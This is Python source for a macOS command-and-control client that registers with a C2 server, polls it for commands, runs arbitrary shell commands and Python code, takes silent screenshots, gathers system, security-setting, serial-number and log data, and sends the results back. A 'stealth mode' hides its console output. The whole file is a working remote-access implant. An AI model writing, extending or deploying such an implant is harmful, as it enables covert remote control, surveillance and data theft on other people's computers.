#!/usr/bin/env python3
"""
macOS-specific C2 Client
Specialized client for macOS systems with macOS-specific capabilities
"""

import requests
import json
import time
import platform
import socket
import subprocess
import threading
import uuid
import base64
import os
import sys
import psutil
import logging
from datetime import datetime
from pathlib import Path
import argparse
import signal
import tempfile
import shutil
import plistlib

# macOS-specific imports
try:
    from PIL import Image
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

try:
    import Quartz
    import CoreFoundation
    MACOS_QUARTZ_AVAILABLE = True
except ImportError:
    MACOS_QUARTZ_AVAILABLE = False

class MacC2Client:
    def __init__(self, server_url="http://localhost:8000", client_id=None, stealth_mode=False):
        self.server_url = server_url
        self.client_id = client_id or "mac_{}".format(uuid.uuid4().hex[:8])
        self.session = requests.Session()
        self.running = False
        self.stealth_mode = stealth_mode
        
        # Setup logging
        self.setup_logging()
        
        # Create temp directory
        self.temp_dir = tempfile.mkdtemp(prefix="c2_mac_")
        self.logger.info("macOS client temp directory: {}".format(self.temp_dir))
    
    def setup_logging(self):
        """Setup logging for the client"""
        log_file = os.path.join(self.temp_dir, "mac_client.log") if hasattr(self, 'temp_dir') else "mac_client.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def get_system_info(self):
        """Get macOS-specific system information"""
        try:
            hostname = socket.gethostname()
            username = os.getenv('USER', 'unknown')
            os_info = "{} {} {}".format(platform.system(), platform.release(), platform.version())
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except Exception:
                ip_address = "127.0.0.1"
            finally:
                s.close()
            
            # Get macOS-specific info
            system_info = {
                "agent_id": self.client_id,
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "ip_address": ip_address,
                "port": 0,
                "platform": "macos",
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "python_version": sys.version,
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "is_root": os.geteuid() == 0,
                "uid": os.getuid(),
                "gid": os.getgid(),
                "shell": os.environ.get('SHELL', 'unknown'),
                "home": os.environ.get('HOME', 'unknown'),
                "macos_version": self.get_macos_version(),
                "hardware_model": self.get_hardware_model(),
                "serial_number": self.get_serial_number()
            }
            
            return system_info
        except Exception as e:
            self.logger.error("Error getting system info: {}".format(e))
            return None
    
    def get_macos_version(self):
        """Get macOS version information"""
        try:
            result = subprocess.run(
                ["sw_vers"],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                version_info = {}
                for line in result.stdout.split('\n'):
                    if ':' in line:
                        key, value = line.split(':', 1)
                        version_info[key.strip()] = value.strip()
                return version_info
            return "Unknown"
        except Exception:
            return "Unknown"
    
    def get_hardware_model(self):
        """Get hardware model information"""
        try:
            result = subprocess.run(
                ["system_profiler", "SPHardwareDataType"],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                # Parse hardware info
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Model Name:' in line:
                        return line.split(':', 1)[1].strip()
                return "Unknown"
            return "Unknown"
        except Exception:
            return "Unknown"
    
    def get_serial_number(self):
        """Get system serial number"""
        try:
            result = subprocess.run(
                ["system_profiler", "SPHardwareDataType"],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Serial Number' in line:
                        return line.split(':', 1)[1].strip()
                return "Unknown"
            return "Unknown"
        except Exception:
            return "Unknown"
    
    def register(self):
        """Register with the C2 server"""
        system_info = self.get_system_info()
        if not system_info:
            return False
        
        try:
            # Register directly without authentication
            response = self.session.post(
                "{}/api/agents/register".format(self.server_url),
                json=system_info
            )
            
            if response.status_code == 200:
                self.logger.info("Successfully registered as macOS client {}".format(self.client_id))
                return True
            else:
                self.logger.error("Registration failed: {}".format(response.text))
                return False
        except Exception as e:
            self.logger.error("Registration error: {}".format(e))
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            response = self.session.post(
                "{}/api/agents/{}/heartbeat".format(self.server_url, self.client_id)
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Heartbeat error: {}".format(e))
            return False
    
    def get_commands(self):
        """Get pending commands from server"""
        try:
            response = self.session.get(
                "{}/api/commands/{}".format(self.server_url, self.client_id)
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("commands", [])
            else:
                return []
        except Exception as e:
            self.logger.error("Error getting commands: {}".format(e))
            return []
    
    def execute_command(self, command, command_type="shell"):
        """Execute a command with macOS-specific handling"""
        try:
            if command_type == "shell":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout + result.stderr
                success = result.returncode == 0
                
                return {
                    "result": output,
                    "success": success,
                    "return_code": result.returncode
                }
            elif command_type == "python":
                try:
                    exec_globals = {"__builtins__": __builtins__}
                    exec_locals = {}
                    exec(command, exec_globals, exec_locals)
                    return {
                        "result": "Python code executed successfully",
                        "success": True,
                        "return_code": 0
                    }
                except Exception as e:
                    return {
                        "result": "Python execution error: {}".format(str(e)),
                        "success": False,
                        "return_code": 1
                    }
            else:
                return {
                    "result": "Unknown command type: {}".format(command_type),
                    "success": False,
                    "return_code": 1
                }
        except subprocess.TimeoutExpired:
            return {
                "result": "Command timed out",
                "success": False,
                "return_code": 124
            }
        except Exception as e:
            return {
                "result": "Error executing command: {}".format(str(e)),
                "success": False,
                "return_code": 1
            }
    
    def take_screenshot(self):
        """Take a screenshot using macOS-specific methods"""
        if not SCREENSHOT_AVAILABLE:
            # Try using screencapture as fallback
            try:
                screenshot_path = os.path.join(self.temp_dir, "screenshot_{}.png".format(int(time.time())))
                result = subprocess.run(
                    ["screencapture", "-x", screenshot_path],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0 and os.path.exists(screenshot_path):
                    with open(screenshot_path, "rb") as f:
                        image_data = base64.b64encode(f.read()).decode('utf-8')
                    
                    os.remove(screenshot_path)
                    
                    return {
                        "result": "Screenshot captured successfully (screencapture)",
                        "success": True,
                        "image_data": image_data,
                        "timestamp": datetime.now().isoformat()
                    }
                else:
                    return {
                        "result": "Screenshot failed. Install Pillow+pyautogui or use screencapture",
                        "success": False
                    }
            except Exception:
                return {
                    "result": "Screenshot libraries not available. Install with: pip install Pillow pyautogui",
                    "success": False
                }
        
        try:
            screenshot = pyautogui.screenshot()
            
            # Save to temp file
            screenshot_path = os.path.join(self.temp_dir, "screenshot_{}.png".format(int(time.time())))
            screenshot.save(screenshot_path)
            
            # Convert to base64
            with open(screenshot_path, "rb") as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Clean up temp file
            os.remove(screenshot_path)
            
            return {
                "result": "Screenshot captured successfully",
                "success": True,
                "image_data": image_data,
                "timestamp": datetime.now().isoformat(),
                "resolution": screenshot.size
            }
        except Exception as e:
            return {
                "result": "Screenshot error: {}".format(str(e)),
                "success": False
            }
    
    def get_macos_logs(self, log_type="system", lines=100):
        """Get macOS system logs"""
        try:
            if log_type == "system":
                result = subprocess.run(
                    ["log", "show", "--last", "{}m".format(lines//10), "--style", "compact"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            elif log_type == "crash":
                result = subprocess.run(
                    ["log", "show", "--predicate", "category == 'crash'", "--last", "{}m".format(lines//10), "--style", "compact"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            elif log_type == "network":
                result = subprocess.run(
                    ["log", "show", "--predicate", "category == 'network'", "--last", "{}m".format(lines//10), "--style", "compact"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    ["log", "show", "--last", "{}m".format(lines//10), "--style", "compact"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "log_type": log_type,
                "lines": lines
            }
        except Exception as e:
            return {
                "result": "macOS log collection error: {}".format(str(e)),
                "success": False
            }
    
    def get_launchd_services(self):
        """Get launchd services"""
        try:
            result = subprocess.run(
                ["launchctl", "list"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "launchd_services"
            }
        except Exception as e:
            return {
                "result": "Launchd services enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_installed_apps(self):
        """Get installed applications"""
        try:
            # Get applications from /Applications
            apps = []
            apps_dir = "/Applications"
            if os.path.exists(apps_dir):
                for item in os.listdir(apps_dir):
                    if item.endswith('.app'):
                        app_path = os.path.join(apps_dir, item)
                        apps.append({
                            "name": item,
                            "path": app_path,
                            "bundle_id": self.get_bundle_id(app_path)
                        })
            
            return {
                "result": "Installed applications retrieved",
                "success": True,
                "apps": apps,
                "count": len(apps)
            }
        except Exception as e:
            return {
                "result": "Installed apps enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_bundle_id(self, app_path):
        """Get bundle ID for an application"""
        try:
            info_plist = os.path.join(app_path, "Contents", "Info.plist")
            if os.path.exists(info_plist):
                with open(info_plist, 'rb') as f:
                    plist = plistlib.load(f)
                    return plist.get('CFBundleIdentifier', 'Unknown')
            return "Unknown"
        except Exception:
            return "Unknown"
    
    def get_network_interfaces(self):
        """Get network interface information"""
        try:
            result = subprocess.run(
                ["ifconfig"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "network_interfaces"
            }
        except Exception as e:
            return {
                "result": "Network interface enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_system_preferences(self):
        """Get system preferences information"""
        try:
            result = subprocess.run(
                ["defaults", "read", "com.apple.systempreferences"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "system_preferences"
            }
        except Exception as e:
            return {
                "result": "System preferences enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_security_info(self):
        """Get security-related information"""
        try:
            security_info = {}
            
            # Get Gatekeeper status
            result = subprocess.run(
                ["spctl", "--status"],
                capture_output=True,
                text=True,
                timeout=10
            )
            security_info["gatekeeper"] = result.stdout.strip() if result.returncode == 0 else "Unknown"
            
            # Get SIP status
            result = subprocess.run(
                ["csrutil", "status"],
                capture_output=True,
                text=True,
                timeout=10
            )
            security_info["sip"] = result.stdout.strip() if result.returncode == 0 else "Unknown"
            
            # Get FileVault status
            result = subprocess.run(
                ["fdesetup", "status"],
                capture_output=True,
                text=True,
                timeout=10
            )
            security_info["filevault"] = result.stdout.strip() if result.returncode == 0 else "Unknown"
            
            return {
                "result": "Security information retrieved",
                "success": True,
                "security_info": security_info
            }
        except Exception as e:
            return {
                "result": "Security info enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_kext_info(self):
        """Get kernel extension information"""
        try:
            result = subprocess.run(
                ["kextstat"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "kernel_extensions"
            }
        except Exception as e:
            return {
                "result": "Kernel extensions enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def submit_result(self, command_id, result, success, additional_data=None):
        """Submit command result to server"""
        try:
            result_data = {
                "agent_id": self.client_id,
                "command_id": command_id,
                "result": result,
                "success": success,
                "timestamp": datetime.utcnow().isoformat()
            }
            
            if additional_data:
                result_data.update(additional_data)
            
            response = self.session.post(
                "{}/api/commands/result".format(self.server_url),
                json=result_data
            )
            
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Error submitting result: {}".format(e))
            return False
    
    def process_commands(self):
        """Process pending commands with macOS-specific handling"""
        commands = self.get_commands()
        
        for cmd in commands:
            if cmd.get("status") == "pending":
                self.logger.info("Executing command: {}".format(cmd['command']))
                
                command_type = cmd.get("command_type", "shell")
                command_text = cmd['command']
                
                # Handle macOS-specific commands
                if command_text.startswith("SCREENSHOT"):
                    result_data = self.take_screenshot()
                elif command_text.startswith("MACOS_LOGS"):
                    parts = command_text.split()
                    log_type = parts[1] if len(parts) > 1 else "system"
                    lines = int(parts[2]) if len(parts) > 2 else 100
                    result_data = self.get_macos_logs(log_type, lines)
                elif command_text.startswith("LAUNCHD"):
                    result_data = self.get_launchd_services()
                elif command_text.startswith("APPS"):
                    result_data = self.get_installed_apps()
                elif command_text.startswith("INTERFACES"):
                    result_data = self.get_network_interfaces()
                elif command_text.startswith("PREFERENCES"):
                    result_data = self.get_system_preferences()
                elif command_text.startswith("SECURITY"):
                    result_data = self.get_security_info()
                elif command_text.startswith("KEXT"):
                    result_data = self.get_kext_info()
                else:
                    result_data = self.execute_command(command_text, command_type)
                
                self.submit_result(
                    cmd["command_id"],
                    result_data["result"],
                    result_data["success"],
                    result_data
                )
                
                self.logger.info("Command result: {}".format(result_data['success']))
    
    def cleanup(self):
        """Cleanup resources"""
        try:
            # Clean up temp directory
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            
            self.logger.info("macOS client cleanup completed")
        except Exception as e:
            self.logger.error("Cleanup error: {}".format(e))
    
    def run(self):
        """Main client loop"""
        self.logger.info("Starting macOS C2 Client {}".format(self.client_id))
        
        # Register with server
        if not self.register():
            self.logger.error("Failed to register with server. Exiting.")
            return
        
        self.running = True
        
        # Setup signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            self.logger.info("Received signal {}, shutting down...".format(signum))
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            while self.running:
                # Send heartbeat
                self.send_heartbeat()
                
                # Process commands
                self.process_commands()
                
                # Wait before next iteration
                time.sleep(5)
                
        except KeyboardInterrupt:
            self.logger.info("Client stopped by user")
        except Exception as e:
            self.logger.error("Client error: {}".format(e))
        finally:
            self.running = False
            self.cleanup()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="macOS C2 Client")
    parser.add_argument("--server", default="http://localhost:8000", help="C2 Server URL")
    parser.add_argument("--client-id", help="Custom client ID")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    
    args = parser.parse_args()
    
    client = MacC2Client(
        server_url=args.server,
        client_id=args.client_id,
        stealth_mode=args.stealth
    )
    
    try:
        client.run()
    except Exception as e:
        print("macOS client error: {}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
